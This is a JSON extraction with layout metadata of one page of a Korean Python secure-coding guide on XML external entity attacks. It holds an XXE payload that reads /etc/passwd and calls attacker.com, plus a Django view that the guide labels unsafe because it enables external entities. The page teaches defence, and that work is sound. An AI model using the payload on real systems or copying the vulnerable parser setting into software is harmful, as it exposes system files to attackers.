@@ -1,0 +1,919 @@
+{
+ "lines": [
+  {
+   "text": "Python 시큐어코딩 가이드",
+   "bbox": [
+    70.2473373413086,
+    47.02835464477539,
+    166.67918395996094,
+    55.058170318603516
+   ],
+   "block": 0,
+   "size": 7.7757439613342285,
+   "fonts": [
+    "GmarketSansTTFMedium"
+   ]
+  },
+  {
+   "text": "40",
+   "bbox": [
+    65.09266662597656,
+    702.9564819335938,
+    74.17008209228516,
+    710.9862670898438
+   ],
+   "block": 1,
+   "size": 8.030754089355469,
+   "fonts": [
+    "KoPubDotumMedium"
+   ]
+  },
+  {
+   "text": "많이 사용하는 XML 파서의 한 종류인 lxml의 경우 외부 엔티티 구문 분석 옵션인 resolve_entities 옵션을 ",
+   "bbox": [
+    75.04237365722656,
+    93.91288757324219,
+    506.96392822265625,
+    103.86027526855469
+   ],
+   "block": 2,
+   "size": 9.948545455932617,
+   "fonts": [
+    "KoPubDotumMedium"
+   ]
+  },
+  {
+   "text": "비활성화 해야 한다. 또한 외부 문서 조회 시 네트워크 액세스를 방지하는 no_network 옵션이 활성화(True) ",
+   "bbox": [
+    65.09266662597656,
+    110.93130493164062,
+    506.9654846191406,
+    120.87869262695312
+   ],
+   "block": 3,
+   "size": 9.948545455932617,
+   "fonts": [
+    "KoPubDotumMedium"
+   ]
+  },
+  {
+   "text": "되어 있는지도 확인해야 한다.",
+   "bbox": [
+    65.09266662597656,
+    127.82987213134766,
+    187.5939483642578,
+    137.77725219726562
+   ],
+   "block": 4,
+   "size": 9.948545455932617,
+   "fonts": [
+    "KoPubDotumMedium"
+   ]
+  },
+  {
+   "text": "다. 코드예제",
+   "bbox": [
+    65.09266662597656,
+    158.7506561279297,
+    119.12395477294922,
+    169.2972869873047
+   ],
+   "block": 5,
+   "size": 10.547856330871582,
+   "fonts": [
+    "KoPubDotumMedium"
+   ]
+  },
+  {
+   "text": "다음 예제는 XML 소스를 읽어와 분석하는 코드다. 공격자는 아래와 같이 XML 외부 엔티티를 참조하는 ",
+   "bbox": [
+    75.04237365722656,
+    181.761474609375,
+    506.9637451171875,
+    191.70884704589844
+   ],
+   "block": 6,
+   "size": 9.948545455932617,
+   "fonts": [
+    "KoPubDotumMedium"
+   ]
+  },
+  {
+   "text": "xxe.xml 데이터를 전송하고 이를 파싱할 때 /etc/passwd 파일을 참조할 수 있다.",
+   "bbox": [
+    65.09266662597656,
+    199.73867797851562,
+    411.0428161621094,
+    209.68605041503906
+   ],
+   "block": 7,
+   "size": 9.948545455932617,
+   "fonts": [
+    "KoPubDotumMedium"
+   ]
+  },
+  {
+   "text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+   "bbox": [
+    80.79642486572266,
+    232.2893829345703,
+    260.9917907714844,
+    240.79859924316406
+   ],
+   "block": 8,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "<!DOCTYPE foo [",
+   "bbox": [
+    80.79642486572266,
+    245.83221435546875,
+    148.40768432617188,
+    254.3414306640625
+   ],
+   "block": 9,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    <!ELEMENT foo ANY >",
+   "bbox": [
+    80.79642486572266,
+    259.3750305175781,
+    187.50704956054688,
+    267.8842468261719
+   ],
+   "block": 10,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    <!ENTITY xxe1 SYSTEM \"file:///etc/passwd\" >",
+   "bbox": [
+    80.79642486572266,
+    272.9178466796875,
+    279.09228515625,
+    281.42706298828125
+   ],
+   "block": 11,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    <!ENTITY xxe2 SYSTEM \"http://attacker.com/text.txt\">",
+   "bbox": [
+    80.79642486572266,
+    286.460693359375,
+    310.61907958984375,
+    294.96990966796875
+   ],
+   "block": 12,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "]>",
+   "bbox": [
+    80.79642486572266,
+    300.12335205078125,
+    87.05130004882812,
+    308.632568359375
+   ],
+   "block": 13,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "<foo>&xxe1;&xxe2;</foo>",
+   "bbox": [
+    80.79642486572266,
+    314.8646545410156,
+    176.715087890625,
+    323.3738708496094
+   ],
+   "block": 14,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "안전하지 않은 코드 예시",
+   "bbox": [
+    233.2786865234375,
+    350.0280456542969,
+    335.33807373046875,
+    359.9754333496094
+   ],
+   "block": 15,
+   "size": 9.948545455932617,
+   "fonts": [
+    "KoPubDotumBold"
+   ]
+  },
+  {
+   "text": "1:",
+   "bbox": [
+    89.78712463378906,
+    371.1932067871094,
+    97.27186584472656,
+    379.7024230957031
+   ],
+   "block": 18,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "2:",
+   "bbox": [
+    89.78712463378906,
+    383.8970947265625,
+    97.27186584472656,
+    392.40631103515625
+   ],
+   "block": 18,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "3:",
+   "bbox": [
+    89.78712463378906,
+    396.6009826660156,
+    97.27186584472656,
+    405.1101989746094
+   ],
+   "block": 18,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "4:",
+   "bbox": [
+    89.78712463378906,
+    409.30487060546875,
+    97.27186584472656,
+    417.8140869140625
+   ],
+   "block": 18,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "5:",
+   "bbox": [
+    89.78712463378906,
+    422.12860107421875,
+    97.27186584472656,
+    430.6378173828125
+   ],
+   "block": 19,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "6:",
+   "bbox": [
+    89.78712463378906,
+    434.8324890136719,
+    97.27186584472656,
+    443.3417053222656
+   ],
+   "block": 19,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "7:",
+   "bbox": [
+    89.78712463378906,
+    447.536376953125,
+    97.27186584472656,
+    456.04559326171875
+   ],
+   "block": 19,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "8:",
+   "bbox": [
+    89.78712463378906,
+    460.2402648925781,
+    97.27186584472656,
+    468.7494812011719
+   ],
+   "block": 19,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "9:",
+   "bbox": [
+    89.78712463378906,
+    472.94415283203125,
+    97.27186584472656,
+    481.453369140625
+   ],
+   "block": 19,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "10:",
+   "bbox": [
+    85.1119613647461,
+    485.6480407714844,
+    97.27190399169922,
+    494.1572570800781
+   ],
+   "block": 19,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "11:",
+   "bbox": [
+    85.1119613647461,
+    498.4718017578125,
+    97.27190399169922,
+    506.98101806640625
+   ],
+   "block": 20,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "12:",
+   "bbox": [
+    85.1119613647461,
+    511.1756591796875,
+    97.27190399169922,
+    519.6848754882812
+   ],
+   "block": 20,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "13:",
+   "bbox": [
+    85.1119613647461,
+    523.8795776367188,
+    97.27190399169922,
+    532.3887939453125
+   ],
+   "block": 20,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "14:",
+   "bbox": [
+    85.1119613647461,
+    536.5834350585938,
+    97.27190399169922,
+    545.0926513671875
+   ],
+   "block": 20,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "15:",
+   "bbox": [
+    85.1119613647461,
+    549.287353515625,
+    97.27190399169922,
+    557.7965698242188
+   ],
+   "block": 20,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "16:",
+   "bbox": [
+    85.1119613647461,
+    561.9912109375,
+    97.27190399169922,
+    570.5004272460938
+   ],
+   "block": 20,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "17:",
+   "bbox": [
+    85.1119613647461,
+    574.81494140625,
+    97.27190399169922,
+    583.3241577148438
+   ],
+   "block": 21,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "18:",
+   "bbox": [
+    85.1119613647461,
+    587.5188598632812,
+    97.27190399169922,
+    596.028076171875
+   ],
+   "block": 21,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "19:",
+   "bbox": [
+    85.1119613647461,
+    600.2227172851562,
+    97.27190399169922,
+    608.73193359375
+   ],
+   "block": 21,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "20:",
+   "bbox": [
+    85.1119613647461,
+    612.9266357421875,
+    97.27190399169922,
+    621.4358520507812
+   ],
+   "block": 21,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "21:",
+   "bbox": [
+    85.1119613647461,
+    625.6304931640625,
+    97.27190399169922,
+    634.1397094726562
+   ],
+   "block": 21,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "22:",
+   "bbox": [
+    85.1119613647461,
+    638.3344116210938,
+    97.27190399169922,
+    646.8436279296875
+   ],
+   "block": 21,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "23:",
+   "bbox": [
+    85.1119613647461,
+    651.1581420898438,
+    97.27190399169922,
+    659.6673583984375
+   ],
+   "block": 22,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "from xml.sax import make_parser",
+   "bbox": [
+    107.28901672363281,
+    370.6915283203125,
+    240.6160125732422,
+    379.7024230957031
+   ],
+   "block": 23,
+   "size": 8.510202407836914,
+   "fonts": [
+    "Haansoft Batang",
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "from xml.sax.handler import feature_external_ges",
+   "bbox": [
+    107.28901672363281,
+    383.3954162597656,
+    302.19830322265625,
+    392.40631103515625
+   ],
+   "block": 23,
+   "size": 8.510202407836914,
+   "fonts": [
+    "Haansoft Batang",
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "from xml.dom.pulldom import parseString, START_ELEMENT",
+   "bbox": [
+    107.28901672363281,
+    396.09930419921875,
+    347.08966064453125,
+    405.1101989746094
+   ],
+   "block": 23,
+   "size": 8.510202407836914,
+   "fonts": [
+    "Haansoft Batang",
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "from django.shortcuts import render",
+   "bbox": [
+    107.28901672363281,
+    408.8031921386719,
+    250.68600463867188,
+    417.8140869140625
+   ],
+   "block": 23,
+   "size": 8.510202407836914,
+   "fonts": [
+    "Haansoft Batang",
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "from .model import comments",
+   "bbox": [
+    107.28901672363281,
+    422.12860107421875,
+    229.43373107910156,
+    430.6378173828125
+   ],
+   "block": 24,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "def get_xml(request):",
+   "bbox": [
+    107.28901672363281,
+    447.0346984863281,
+    191.25448608398438,
+    456.04559326171875
+   ],
+   "block": 25,
+   "size": 8.510202407836914,
+   "fonts": [
+    "Haansoft Batang",
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "  if request.method == “GET”:",
+   "bbox": [
+    107.28901672363281,
+    460.2402648925781,
+    229.73519897460938,
+    468.7494812011719
+   ],
+   "block": 25,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    data = comments.objects.all()",
+   "bbox": [
+    107.28901672363281,
+    472.94415283203125,
+    240.71131896972656,
+    481.453369140625
+   ],
+   "block": 25,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    com = data[0].comment",
+   "bbox": [
+    107.28901672363281,
+    485.6480407714844,
+    219.39886474609375,
+    494.1572570800781
+   ],
+   "block": 25,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    return render(request, '/xml_view.html', {'com':com})",
+   "bbox": [
+    107.28901672363281,
+    497.9701232910156,
+    330.1396789550781,
+    506.98101806640625
+   ],
+   "block": 26,
+   "size": 8.510202407836914,
+   "fonts": [
+    "Haansoft Batang",
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "  elif request.method == “POST”:",
+   "bbox": [
+    107.28901672363281,
+    523.8795776367188,
+    241.96266174316406,
+    532.3887939453125
+   ],
+   "block": 27,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    parser = make_parser()",
+   "bbox": [
+    107.28901672363281,
+    536.5834350585938,
+    215.53782653808594,
+    545.0926513671875
+   ],
+   "block": 27,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    # 외부 일반 엔티티를 포함하는 설정을 True로 적용할 경우 취약하다",
+   "bbox": [
+    107.28901672363281,
+    549.287353515625,
+    369.207275390625,
+    557.7965698242188
+   ],
+   "block": 27,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    parser.setFeature(feature_external_ges, True)",
+   "bbox": [
+    107.28901672363281,
+    561.9912109375,
+    300.41046142578125,
+    570.5004272460938
+   ],
+   "block": 27,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    doc = parseString(request.body.decode(‘utf-8’), parser=parser)",
+   "bbox": [
+    107.28901672363281,
+    574.81494140625,
+    370.055908203125,
+    583.3241577148438
+   ],
+   "block": 28,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    for event, node in doc:",
+   "bbox": [
+    107.28901672363281,
+    587.5188598632812,
+    217.5070343017578,
+    596.028076171875
+   ],
+   "block": 28,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "      if event == START_ELEMENT and node.tagName == “foo”:",
+   "bbox": [
+    107.28901672363281,
+    600.2227172851562,
+    368.4319152832031,
+    608.73193359375
+   ],
+   "block": 28,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "        doc.expandNode(node)",
+   "bbox": [
+    107.28901672363281,
+    612.9266357421875,
+    229.32530212402344,
+    621.4358520507812
+   ],
+   "block": 28,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "        text = node.toxml()",
+   "bbox": [
+    107.28901672363281,
+    625.6304931640625,
+    217.4568634033203,
+    634.1397094726562
+   ],
+   "block": 28,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "        comments.objects.filter(id=1).update(comment=text)",
+   "bbox": [
+    107.28901672363281,
+    638.3344116210938,
+    343.68359375,
+    646.8436279296875
+   ],
+   "block": 28,
+   "size": 8.510202407836914,
+   "fonts": [
+    "KoPubDotumLight"
+   ]
+  },
+  {
+   "text": "    return render(request, '/xml_view.html')",
+   "bbox": [
+    107.28901672363281,
+    650.6564331054688,
+    279.43212890625,
+    659.6673583984375
+   ],
+   "block": 29,
+   "size": 8.510202407836914,
+   "fonts": [
+    "Haansoft Batang",
+    "KoPubDotumLight"
+   ]
+  }
+ ],
+ "regions": [
+  {
+   "kind": "code",
+   "indices": [
+    16,
+    17,
+    18,
+    19,
+    20,
+    21,
+    22,
+    23,
+    24,
+    25,
+    26,
+    27,
+    28,
+    29,
+    30,
+    31,
+    32,
+    33,
+    34,
+    35,
+    36,
+    37,
+    38,
+    39,
+    40,
+    41,
+    42,
+    43,
+    44,
+    45,
+    46,
+    47,
+    48,
+    49,
+    50,
+    51,
+    52,
+    53,
+    54,
+    55,
+    56,
+    57,
+    58,
+    59
+   ],
+   "text": "1: from xml.sax import make_parser\n2: from xml.sax.handler import feature_external_ges\n3: from xml.dom.pulldom import parseString, START_ELEMENT\n4: from django.shortcuts import render\n5: from .model import comments\n6:\n7: def get_xml(request):\n8:   if request.method == “GET”:\n9:     data = comments.objects.all()\n10:     com = data[0].comment\n11:     return render(request, '/xml_view.html', {'com':com})\n12:\n13:   elif request.method == “POST”:\n14:     parser = make_parser()\n15:     # 외부 일반 엔티티를 포함하는 설정을 True로 적용할 경우 취약하다\n16:     parser.setFeature(feature_external_ges, True)\n17:     doc = parseString(request.body.decode(‘utf-8’), parser=parser)\n18:     for event, node in doc:\n19:       if event == START_ELEMENT and node.tagName == “foo”:\n20:         doc.expandNode(node)\n21:         text = node.toxml()\n22:         comments.objects.filter(id=1).update(comment=text)\n23:     return render(request, '/xml_view.html')",
+   "language": "python",
+   "label": "안전하지 않은 코드 예시",
+   "bbox": [
+    85.1119613647461,
+    360.0754333496094,
+    370.055908203125,
+    660.8673583984375
+   ]
+  }
+ ],
+ "native": "Python 시큐어코딩 가이드\n40\n많이 사용하는 XML 파서의 한 종류인 lxml의 경우 외부 엔티티 구문 분석 옵션인 resolve_entities 옵션을 \n비활성화 해야 한다. 또한 외부 문서 조회 시 네트워크 액세스를 방지하는 no_network 옵션이 활성화(True) \n되어 있는지도 확인해야 한다.\n다. 코드예제\n다음 예제는 XML 소스를 읽어와 분석하는 코드다. 공격자는 아래와 같이 XML 외부 엔티티를 참조하는 \nxxe.xml 데이터를 전송하고 이를 파싱할 때 /etc/passwd 파일을 참조할 수 있다.\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n    <!ELEMENT foo ANY >\n    <!ENTITY xxe1 SYSTEM \"file:///etc/passwd\" >\n    <!ENTITY xxe2 SYSTEM \"http://attacker.com/text.txt\">\n]>\n<foo>&xxe1;&xxe2;</foo>\n안전하지 않은 코드 예시\n1:\n2:\n3:\n4:\n5:\n6:\n7:\n8:\n9:\n10:\n11:\n12:\n13:\n14:\n15:\n16:\n17:\n18:\n19:\n20:\n21:\n22:\n23:\nfrom xml.sax import make_parser\nfrom xml.sax.handler import feature_external_ges\nfrom xml.dom.pulldom import parseString, START_ELEMENT\nfrom django.shortcuts import render\nfrom .model import comments\ndef get_xml(request):\n  if request.method == “GET”:\n    data = comments.objects.all()\n    com = data[0].comment\n    return render(request, '/xml_view.html', {'com':com})\n  elif request.method == “POST”:\n    parser = make_parser()\n    # 외부 일반 엔티티를 포함하는 설정을 True로 적용할 경우 취약하다\n    parser.setFeature(feature_external_ges, True)\n    doc = parseString(request.body.decode(‘utf-8’), parser=parser)\n    for event, node in doc:\n      if event == START_ELEMENT and node.tagName == “foo”:\n        doc.expandNode(node)\n        text = node.toxml()\n        comments.objects.filter(id=1).update(comment=text)\n    return render(request, '/xml_view.html')\n",
+ "native_sha256": "2857ed53551acc28e1dff9907eda2d1b7f97d5647ca675de922d5ac848f20b2d",
+ "chars": 1446,
+ "replacement_characters": 0,
+ "control_characters": [],
+ "source_sha256": "56c33d0f4a374c4c4dc048dd9f3cbbc433a014b5f5b6b98ad2e5580b5b8d3752",
+ "version": 1,
+ "code_version": 4
+}
